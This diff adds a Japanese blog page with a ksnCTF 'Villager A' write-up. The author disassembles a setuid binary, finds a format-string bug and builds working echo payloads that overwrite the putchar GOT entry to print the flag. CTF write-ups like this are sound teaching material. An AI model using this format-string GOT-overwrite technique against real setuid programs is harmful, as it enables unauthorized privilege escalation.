@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="ja">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>ksnCTF Villager A | Note</title>
+    <meta name="description" content="ksnctf villagerA">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.5.1/katex.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/github-markdown-css/2.2.1/github-markdown.css">
+    
+    <link rel="preload" href="/note/assets/css/0.styles.736745c0.css" as="style"><link rel="preload" href="/note/assets/js/app.8332fd24.js" as="script"><link rel="preload" href="/note/assets/js/27.71ee27d6.js" as="script"><link rel="prefetch" href="/note/assets/js/10.d5340a58.js"><link rel="prefetch" href="/note/assets/js/11.6b643cca.js"><link rel="prefetch" href="/note/assets/js/12.f308e0f2.js"><link rel="prefetch" href="/note/assets/js/13.92dd151f.js"><link rel="prefetch" href="/note/assets/js/14.322428b7.js"><link rel="prefetch" href="/note/assets/js/15.de075271.js"><link rel="prefetch" href="/note/assets/js/16.d548b3b0.js"><link rel="prefetch" href="/note/assets/js/17.7236aeca.js"><link rel="prefetch" href="/note/assets/js/18.6fa01edf.js"><link rel="prefetch" href="/note/assets/js/19.2d2bfab7.js"><link rel="prefetch" href="/note/assets/js/2.6de73e29.js"><link rel="prefetch" href="/note/assets/js/20.6e3d5c86.js"><link rel="prefetch" href="/note/assets/js/21.a7687fb1.js"><link rel="prefetch" href="/note/assets/js/22.2e1b4d08.js"><link rel="prefetch" href="/note/assets/js/23.8cbda2e6.js"><link rel="prefetch" href="/note/assets/js/24.db871808.js"><link rel="prefetch" href="/note/assets/js/25.cfd7425b.js"><link rel="prefetch" href="/note/assets/js/26.5bfdab77.js"><link rel="prefetch" href="/note/assets/js/28.95d4e6c8.js"><link rel="prefetch" href="/note/assets/js/29.8433b857.js"><link rel="prefetch" href="/note/assets/js/3.4ff442e6.js"><link rel="prefetch" href="/note/assets/js/30.38dfd4f3.js"><link rel="prefetch" href="/note/assets/js/31.465a0039.js"><link rel="prefetch" href="/note/assets/js/32.d2eacc85.js"><link rel="prefetch" href="/note/assets/js/4.2192dfe2.js"><link rel="prefetch" href="/note/assets/js/5.ed119160.js"><link rel="prefetch" href="/note/assets/js/6.652a6d2c.js"><link rel="prefetch" href="/note/assets/js/7.571ac085.js"><link rel="prefetch" href="/note/assets/js/8.61cd920d.js"><link rel="prefetch" href="/note/assets/js/9.047509d9.js">
+    <link rel="stylesheet" href="/note/assets/css/0.styles.736745c0.css">
+  </head>
+  <body>
+    <div id="app" data-server-rendered="true"><div class="theme-container no-sidebar"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/note/" class="home-link router-link-active"><!----> <span class="site-name">Note</span></a> <div class="links" style="max-width:nullpx;"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/note/todo.html" class="nav-link">Todo</a></div><div class="nav-item"><a href="/note/chukapi_fun_art.html" class="nav-link">Chukapi-Fun-Art</a></div><div class="nav-item"><a href="/note/list.html" class="nav-link">Articles</a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <div class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/note/todo.html" class="nav-link">Todo</a></div><div class="nav-item"><a href="/note/chukapi_fun_art.html" class="nav-link">Chukapi-Fun-Art</a></div><div class="nav-item"><a href="/note/list.html" class="nav-link">Articles</a></div> <!----></nav>  <!----> </div> <div class="page"> <div class="content"><h1 id="ksnctf-villager-a"><a href="#ksnctf-villager-a" aria-hidden="true" class="header-anchor">#</a> ksnCTF Villager A</h1> <ul><li>sshで接続してみる</li></ul> <div class="language-bash= line-numbers-mode"><pre class="language-text"><code>$ ssh -p 10022 q4@ctfq.sweetduet.info
+q4@ctfq.sweetduet.info's password: 
+Last login: Wed Mar 13 13:43:28 2019 from 10.0.2.2
+[q4@localhost ~]$ ls -l
+total 16
+-r--------. 1 q4a  q4a    22  5月 22 02:12 2012 flag.txt
+-rwsr-xr-x. 1 q4a  q4a  5857  5月 22 11:21 2012 q4
+-rw-r--r--. 1 root root  151  6月  1 04:47 2012 readme.txt
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><ul><li>flag.txtというファイルがあるので開きたい</li></ul> <div class="language-bash= line-numbers-mode"><pre class="language-text"><code>[q4@localhost ~]$ cat flag.txt 
+cat: flag.txt: Permission denied
+[q4@localhost ~]$ chmod 755 flag.txt 
+chmod: changing permissions of `flag.txt': Operation not permitted
+[q4@localhost ~]$ whoami
+q4
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><ul><li><code>permission denied</code>らしい</li> <li>当然<code>chmod</code>も使えない</li> <li>自分の名前は<code>q4</code>なので, <code>q4a</code>は使えない</li> <li>q4というファイルのパーミッションは<code>-rwsr-xr-x</code>なので, <code>q4a</code>と異なるグループに属しているユーザでも実行はできそう</li></ul> <div class="language-bash= line-numbers-mode"><pre class="language-text"><code>[q4@localhost ~]$ ./q4
+What's your name?
+q4
+Hi, q4
+
+Do you want the flag?
+yes
+Do you want the flag?
+true
+Do you want the flag?
+yes
+Do you want the flag?
+no
+I see. Good bye.
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><ul><li>noを言うまで問うのをやめてくれない</li> <li><code>objdump</code>で確認する</li></ul> <div class="language-bash= line-numbers-mode"><pre class="language-text"><code>$ objdump -d -M intel ./q4
+~~ 略 ~~~
+080485b4 &lt;main&gt;:
+ 80485b4:       55                      push   ebp
+ 80485b5:       89 e5                   mov    ebp,esp
+ 80485b7:       83 e4 f0                and    esp,0xfffffff0
+ 80485ba:       81 ec 20 04 00 00       sub    esp,0x420
+ 80485c0:       c7 04 24 a4 87 04 08    mov    DWORD PTR [esp],0x80487a4
+ 80485c7:       e8 f8 fe ff ff          call   80484c4 &lt;puts@plt&gt;
+ 80485cc:       a1 04 9a 04 08          mov    eax,ds:0x8049a04
+ 80485d1:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax
+ 80485d5:       c7 44 24 04 00 04 00    mov    DWORD PTR [esp+0x4],0x400
+ 80485dc:       00 
+ 80485dd:       8d 44 24 18             lea    eax,[esp+0x18]
+ 80485e1:       89 04 24                mov    DWORD PTR [esp],eax
+ 80485e4:       e8 9b fe ff ff          call   8048484 &lt;fgets@plt&gt;
+ 80485e9:       c7 04 24 b6 87 04 08    mov    DWORD PTR [esp],0x80487b6
+ 80485f0:       e8 bf fe ff ff          call   80484b4 &lt;printf@plt&gt;
+ 80485f5:       8d 44 24 18             lea    eax,[esp+0x18]
+ 80485f9:       89 04 24                mov    DWORD PTR [esp],eax
+ 80485fc:       e8 b3 fe ff ff          call   80484b4 &lt;printf@plt&gt;
+ 8048601:       c7 04 24 0a 00 00 00    mov    DWORD PTR [esp],0xa
+ 8048608:       e8 67 fe ff ff          call   8048474 &lt;putchar@plt&gt;
+ 804860d:       c7 84 24 18 04 00 00    mov    DWORD PTR [esp+0x418],0x1
+ 8048614:       01 00 00 00 
+ 8048618:       eb 67                   jmp    8048681 &lt;main+0xcd&gt;
+ 804861a:       c7 04 24 bb 87 04 08    mov    DWORD PTR [esp],0x80487bb
+ 8048621:       e8 9e fe ff ff          call   80484c4 &lt;puts@plt&gt;
+ 8048626:       a1 04 9a 04 08          mov    eax,ds:0x8049a04
+ 804862b:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax
+ 804862f:       c7 44 24 04 00 04 00    mov    DWORD PTR [esp+0x4],0x400
+ 8048636:       00 
+ 8048637:       8d 44 24 18             lea    eax,[esp+0x18]
+ 804863b:       89 04 24                mov    DWORD PTR [esp],eax
+ 804863e:       e8 41 fe ff ff          call   8048484 &lt;fgets@plt&gt;
+ 8048643:       85 c0                   test   eax,eax
+ 8048645:       0f 94 c0                sete   al
+ 8048648:       84 c0                   test   al,al
+ 804864a:       74 0a                   je     8048656 &lt;main+0xa2&gt;
+ 804864c:       b8 00 00 00 00          mov    eax,0x0
+ 8048651:       e9 86 00 00 00          jmp    80486dc &lt;main+0x128&gt;
+ 8048656:       c7 44 24 04 d1 87 04    mov    DWORD PTR [esp+0x4],0x80487d1
+ 804865d:       08 
+ 804865e:       8d 44 24 18             lea    eax,[esp+0x18]
+ 8048662:       89 04 24                mov    DWORD PTR [esp],eax
+ 8048665:       e8 7a fe ff ff          call   80484e4 &lt;strcmp@plt&gt;
+ 804866a:       85 c0                   test   eax,eax
+ 804866c:       75 13                   jne    8048681 &lt;main+0xcd&gt;
+ 804866e:       c7 04 24 d5 87 04 08    mov    DWORD PTR [esp],0x80487d5
+ 8048675:       e8 4a fe ff ff          call   80484c4 &lt;puts@plt&gt;
+ 804867a:       b8 00 00 00 00          mov    eax,0x0
+ 804867f:       eb 5b                   jmp    80486dc &lt;main+0x128&gt;
+ 8048681:       8b 84 24 18 04 00 00    mov    eax,DWORD PTR [esp+0x418]
+ 8048688:       85 c0                   test   eax,eax
+ 804868a:       0f 95 c0                setne  al
+ 804868d:       84 c0                   test   al,al
+ 804868f:       75 89                   jne    804861a &lt;main+0x66&gt;
+ 8048691:       c7 44 24 04 e6 87 04    mov    DWORD PTR [esp+0x4],0x80487e6
+ 8048698:       08 
+ 8048699:       c7 04 24 e8 87 04 08    mov    DWORD PTR [esp],0x80487e8
+ 80486a0:       e8 ff fd ff ff          call   80484a4 &lt;fopen@plt&gt;
+ 80486a5:       89 84 24 1c 04 00 00    mov    DWORD PTR [esp+0x41c],eax
+ 80486ac:       8b 84 24 1c 04 00 00    mov    eax,DWORD PTR [esp+0x41c]
+ 80486b3:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax
+ 80486b7:       c7 44 24 04 00 04 00    mov    DWORD PTR [esp+0x4],0x400
+ 80486be:       00 
+ 80486bf:       8d 44 24 18             lea    eax,[esp+0x18]
+ 80486c3:       89 04 24                mov    DWORD PTR [esp],eax
+ 80486c6:       e8 b9 fd ff ff          call   8048484 &lt;fgets@plt&gt;
+ 80486cb:       8d 44 24 18             lea    eax,[esp+0x18]
+ 80486cf:       89 04 24                mov    DWORD PTR [esp],eax
+ 80486d2:       e8 dd fd ff ff          call   80484b4 &lt;printf@plt&gt;
+ 80486d7:       b8 00 00 00 00          mov    eax,0x0
+ 80486dc:       c9                      leave  
+ 80486dd:       c3                      ret    
+ 80486de:       90                      nop
+ 80486df:       90                      nop
+~~ 略 ~~~
+
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br></div></div><ul><li>出力より, 次のようにmainが実行されていることがわかる
+<ul><li>puts</li> <li>fgets</li> <li>printf</li> <li>printf</li> <li>putchar</li> <li>fopen</li> <li>puts</li></ul></li> <li>fgetsを使用しているのでbofかformat stringを狙える気がする</li></ul> <div class="language-bash= line-numbers-mode"><pre class="language-text"><code>[q4@localhost ~]$ ./q4
+What's your name?
+AAAAAAAAAAAAAAAAAAAAAa
+Hi, AAAAAAAAAAAAAAAAAAAAAa
+
+Do you want the flag?
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Do you want the flag?
+^C
+[q4@localhost ~]$ ./q4
+What's your name?
+AAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p
+Hi, AAAA,0x400,0x9258c0,0x8,0x14,0xc84fc4,0x41414141,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><ul><li>format stringで行けそう!</li> <li>引数は6個目</li> <li>6個目にsystem関数の実行番地を仕込んで実行すれば<code>/bin/sh</code>を実行できるか?</li> <li>できなさそう(system関数の番地がわからない)</li> <li>使えそうな関数を探す</li> <li></li></ul> <div class="language-bash= line-numbers-mode"><pre class="language-text"><code>[q4@localhost ~]$ objdump -d -M intel -j .plt ./q4 
+
+./q4:     file format elf32-i386
+
+
+Disassembly of section .plt:
+
+08048454 &lt;__gmon_start__@plt-0x10&gt;:
+8048454:       ff 35 d4 99 04 08       push   DWORD PTR ds:0x80499d4
+804845a:       ff 25 d8 99 04 08       jmp    DWORD PTR ds:0x80499d8
+8048460:       00 00                   add    BYTE PTR [eax],al
+...
+
+08048464 &lt;__gmon_start__@plt&gt;:
+8048464:       ff 25 dc 99 04 08       jmp    DWORD PTR ds:0x80499dc
+804846a:       68 00 00 00 00          push   0x0
+804846f:       e9 e0 ff ff ff          jmp    8048454 &lt;_init+0x30&gt;
+
+08048474 &lt;putchar@plt&gt;:
+8048474:       ff 25 e0 99 04 08       jmp    DWORD PTR ds:0x80499e0
+804847a:       68 08 00 00 00          push   0x8
+804847f:       e9 d0 ff ff ff          jmp    8048454 &lt;_init+0x30&gt;
+
+08048484 &lt;fgets@plt&gt;:
+8048484:       ff 25 e4 99 04 08       jmp    DWORD PTR ds:0x80499e4
+804848a:       68 10 00 00 00          push   0x10
+804848f:       e9 c0 ff ff ff          jmp    8048454 &lt;_init+0x30&gt;
+
+08048494 &lt;__libc_start_main@plt&gt;:
+8048494:       ff 25 e8 99 04 08       jmp    DWORD PTR ds:0x80499e8
+804849a:       68 18 00 00 00          push   0x18
+804849f:       e9 b0 ff ff ff          jmp    8048454 &lt;_init+0x30&gt;
+
+080484a4 &lt;fopen@plt&gt;:
+80484a4:       ff 25 ec 99 04 08       jmp    DWORD PTR ds:0x80499ec
+80484aa:       68 20 00 00 00          push   0x20
+80484af:       e9 a0 ff ff ff          jmp    8048454 &lt;_init+0x30&gt;
+
+080484b4 &lt;printf@plt&gt;:
+80484b4:       ff 25 f0 99 04 08       jmp    DWORD PTR ds:0x80499f0
+80484ba:       68 28 00 00 00          push   0x28
+80484bf:       e9 90 ff ff ff          jmp    8048454 &lt;_init+0x30&gt;
+
+080484c4 &lt;puts@plt&gt;:
+80484c4:       ff 25 f4 99 04 08       jmp    DWORD PTR ds:0x80499f4
+80484ca:       68 30 00 00 00          push   0x30
+80484cf:       e9 80 ff ff ff          jmp    8048454 &lt;_init+0x30&gt;
+
+080484d4 &lt;__gxx_personality_v0@plt&gt;:
+80484d4:       ff 25 f8 99 04 08       jmp    DWORD PTR ds:0x80499f8
+80484da:       68 38 00 00 00          push   0x38
+80484df:       e9 70 ff ff ff          jmp    8048454 &lt;_init+0x30&gt;
+
+080484e4 &lt;strcmp@plt&gt;:
+80484e4:       ff 25 fc 99 04 08       jmp    DWORD PTR ds:0x80499fc
+80484ea:       68 40 00 00 00          push   0x40
+80484ef:       e9 60 ff ff ff          jmp    8048454 &lt;_init+0x30&gt;
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br></div></div><ul><li>fopen関数が使えるのでは?</li> <li>先ほどのmain関数を見返してみると, fopenしてくれている部分がある</li> <li>このfopenをprintfとかputsとかから参照してやれば良さそう?</li> <li>fgetsで入力文字列の上書きをするので, fgetsの後のprintfをcallする関数を上書きしてみる</li></ul> <h2 id="攻撃のまとめ"><a href="#攻撃のまとめ" aria-hidden="true" class="header-anchor">#</a> 攻撃のまとめ</h2> <ul><li>fopen関数の番地は, <code>0x080484a4</code></li> <li>printf関数の番地は, <code>0x080484b4</code></li> <li>printf関数内で呼び出しているのは, <code>0x080499f0</code>なので, これを<code>0x080486a0</code>に上書きする</li></ul> <table><thead><tr><th style="text-align:center">入力アドレス</th> <th style="text-align:center">出力バイト数</th> <th style="text-align:center">総出力バイト数</th> <th style="text-align:center">補足</th></tr></thead> <tbody><tr><td style="text-align:center">0x080499f0</td> <td style="text-align:center">4</td> <td style="text-align:center">4</td> <td style="text-align:center">4バイトずつ攻撃</td></tr> <tr><td style="text-align:center">0x080499f2</td> <td style="text-align:center">4</td> <td style="text-align:center">8</td> <td style="text-align:center">''</td></tr> <tr><td style="text-align:center">%39400x</td> <td style="text-align:center">39400</td> <td style="text-align:center">39408</td> <td style="text-align:center">39408(0x99f0)-8=39400</td></tr> <tr><td style="text-align:center">%6$n</td> <td style="text-align:center">0</td> <td style="text-align:center">39408</td> <td style="text-align:center">引数は6個目から</td></tr> <tr><td style="text-align:center">%28180x</td> <td style="text-align:center">28180</td> <td style="text-align:center">67588</td> <td style="text-align:center">67588(0x0804)-39408=28180</td></tr> <tr><td style="text-align:center">%7$n</td> <td style="text-align:center">0</td> <td style="text-align:center">67588</td> <td style="text-align:center">次は7個目</td></tr></tbody></table> <div class="language-bash= line-numbers-mode"><pre class="language-text"><code>echo -e '\xf0\x99\x04\x08\xf2\x99\x04\x08%39400x%6$hn%28180x%7$hn' | ./q4
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><ul><li>通らない</li> <li>printf(0x80499f0)の代わりにputchar(0x80499e0)を使ってみる</li></ul> <div class="language-bash= line-numbers-mode"><pre class="language-text"><code>[q4@localhost ~]$ echo -e '\xe0\x99\x04\x08\xe2\x99\x04\x08%39400x%6$hn%28180x%7$hn' | ./q4
+~~ 略 ~~~
+Segmentation Fault
+~~ 略 ~~~
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><ul><li>gdbで原因を探る</li></ul> <div class="language-bash= line-numbers-mode"><pre class="language-text"><code>[q4@localhost ~]$ echo -e 'r\n\xe0\x99\x04\x08\xe2\x99\x04\x08%39400x%6$hn%28180x%7$hn' | gdb -q ./q4
+Reading symbols from /home/q4/q4...(no debugging symbols found)...done.
+(gdb) Hangup detected on fd 0
+error detected on stdin
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><ul><li>パイプでバグって正しい結果が出力できていないらしい
+<ul><li>ref. <a href="https://stackoverflow.com/questions/8121823/gdb-pipe-redirection-error-gdb-hangup-detected-on-fd-0" target="_blank" rel="noopener noreferrer">https://stackoverflow.com/questions/8121823/gdb-pipe-redirection-error-gdb-hangup-detected-on-fd-0<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li></ul></li> <li>引数ではなく, 呼び出す番地が正しくないという仮説をたててみる</li> <li>fopenを直接呼ぶのではなく, その少し前を呼ぶのはどう?</li> <li>jne命令がある(0x0804868f)ので, その後(0x08048691)からなら呼べそう</li> <li>まとめると次のような感じ</li></ul> <table><thead><tr><th style="text-align:center">入力アドレス</th> <th style="text-align:center">出力バイト数</th> <th style="text-align:center">総出力バイト数</th> <th style="text-align:center">補足</th></tr></thead> <tbody><tr><td style="text-align:center">0x080499f0</td> <td style="text-align:center">4</td> <td style="text-align:center">4</td> <td style="text-align:center">4バイトずつ攻撃</td></tr> <tr><td style="text-align:center">0x080499f2</td> <td style="text-align:center">4</td> <td style="text-align:center">8</td> <td style="text-align:center">''</td></tr> <tr><td style="text-align:center">%34441x</td> <td style="text-align:center">34441</td> <td style="text-align:center">34449</td> <td style="text-align:center">34449(0x8691)-8=34441</td></tr> <tr><td style="text-align:center">%6$n</td> <td style="text-align:center">0</td> <td style="text-align:center">34449</td> <td style="text-align:center">引数は6個目から</td></tr> <tr><td style="text-align:center">%33139x</td> <td style="text-align:center">33139</td> <td style="text-align:center">67588</td> <td style="text-align:center">67588(0x10804)-34449=33139</td></tr> <tr><td style="text-align:center">%7$n</td> <td style="text-align:center">0</td> <td style="text-align:center">67588</td> <td style="text-align:center">次は7個目</td></tr></tbody></table> <ul><li>コマンドは次の通り</li></ul> <div class="language-bash= line-numbers-mode"><pre class="language-text"><code>$ echo -e '\xf0\x99\x04\x08\xf2\x99\x04\x08%34441x%6$hn%33139x%7$hn' | ./q4
+~~ 略 ~~~
+Do you want the flag?
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><ul><li>通らない...</li> <li>一応putcharも試す</li></ul> <div class="language-bash= line-numbers-mode"><pre class="language-text"><code>$ echo -e '\xe0\x99\x04\x08\xe2\x99\x04\x08%34441x%6$hn%33139x%7$hn' | ./q4
+~~ 略 ~~~
+FLAG_~~~ 略 ~~~
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><ul><li>通った!!!!!!!</li></ul> <h1 id="感想"><a href="#感想" aria-hidden="true" class="header-anchor">#</a> 感想</h1> <ul><li>通せたのは嬉しい</li> <li>printfは何故に通らなかったの?</li> <li>ハリネズミ本を見返したら, 正しくはformat string attackではなく, got overwriteだったらしい</li></ul></div> <div class="page-edit"><!----> <!----></div> <!----> </div> <!----></div></div>
+    <script src="/note/assets/js/app.8332fd24.js" defer></script><script src="/note/assets/js/27.71ee27d6.js" defer></script>
+  </body>
+</html>
